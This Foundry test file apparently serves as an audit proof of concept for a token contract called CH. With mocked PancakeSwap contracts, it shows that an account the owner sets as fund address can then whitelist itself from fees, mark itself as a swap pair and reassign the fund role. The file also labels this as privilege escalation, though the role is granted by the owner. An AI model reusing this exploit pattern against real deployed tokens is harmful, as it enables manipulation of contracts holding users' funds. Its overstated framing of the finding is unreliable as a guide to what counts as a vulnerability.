// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CH.sol";

contract MockBUSD {
    function approve(address, uint256) public pure returns (bool) {
        return true;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123);
    }
}

contract MockRouter {
    address public immutable factory;
    
    constructor(address _factory) {
        factory = _factory;
    }
}

contract CH_PrivilegeEscalation_Test is Test {
    CH public token;
    address public owner = makeAddr("owner");
    address public maliciousActor = makeAddr("malicious");

    // Hardcoded PancakeSwap addresses
    address constant HARDCODED_BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant HARDCODED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Deploy mock contracts at expected addresses
        MockBUSD mockBUSD = new MockBUSD();
        vm.etch(HARDCODED_BUSD, address(mockBUSD).code);

        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter(address(mockFactory));
        vm.etch(HARDCODED_ROUTER, address(mockRouter).code);

        // Deploy CH token as owner
        vm.prank(owner);
        token = new CH();
    }

    function test_setFundAddressAllowsPrivilegeEscalation() public {
        // Verify initial setup
        assertEq(token.owner(), owner, "Owner should be setup account");
        console.log("--- BEFORE-Trigger State Snapshots ---");
        // Capture initial state values
        address preFundAddress = token.fundAddress();
        bool preInSwapPairList = token._swapPairList(maliciousActor);
        bool preInFeeWhiteList = token._feeWhiteList(maliciousActor);
        
        console.log("fundAddress Before:", preFundAddress);
        console.log("maliciousActor in swapPairList? Before:", preInSwapPairList);
        console.log("maliciousActor in feeWhiteList? Before:", preInFeeWhiteList);

        // Malicious actor cannot call onlyFunder functions initially
        vm.startPrank(maliciousActor);
        vm.expectRevert("!Funder");
        token.setSwapPairList(address(maliciousActor), true);
        vm.stopPrank();

        console.log("--- TRIGGER: Set maliciousActor as fundAddress ---");
        // Owner sets malicious actor as new fund address
        vm.prank(owner);
        token.setFundAddress(maliciousActor);

        console.log("--- ATTACK: Malicious actor escalates privileges ---");
        // Verify malicious actor can now call onlyFunder functions
        vm.startPrank(maliciousActor);
        token.setSwapPairList(address(maliciousActor), true);
        token.setFeeWhiteList(maliciousActor, true);
        token.setFundAddress(address(0x456));
        vm.stopPrank();

        console.log("--- AFTER-Trigger State Snapshots ---");
        // Capture post-attack state values
        address postFundAddress = token.fundAddress();
        bool postInSwapPairList = token._swapPairList(maliciousActor);
        bool postInFeeWhiteList = token._feeWhiteList(maliciousActor);
        
        console.log("fundAddress After:", postFundAddress);
        console.log("maliciousActor in swapPairList? After:", postInSwapPairList);
        console.log("maliciousActor in feeWhiteList? After:", postInFeeWhiteList);

        console.log("--- DIFFERENTIAL VERDICT ---");
        // Verify state changes indicating exploitation
        bool fundAddressChanged = (postFundAddress == address(0x456));
        bool swapPairUpdated = (postInSwapPairList == true);
        bool feeWhiteListUpdated = (postInFeeWhiteList == true);
        
        console.log("fundAddress changed to malicious-set value (0x456):", fundAddressChanged);
        console.log("swapPairList updated:", swapPairUpdated);
        console.log("feeWhiteList updated:", feeWhiteListUpdated);
        
        // Final vulnerability check
        if (fundAddressChanged && swapPairUpdated && feeWhiteListUpdated) {
            console.log("Vulnerability Exists: Malicious actor successfully escalated privileges and manipulated contract state");
        } else {
            console.log("Vulnerability not Exist: State changes indicate attack was not successful");
        }
    }
}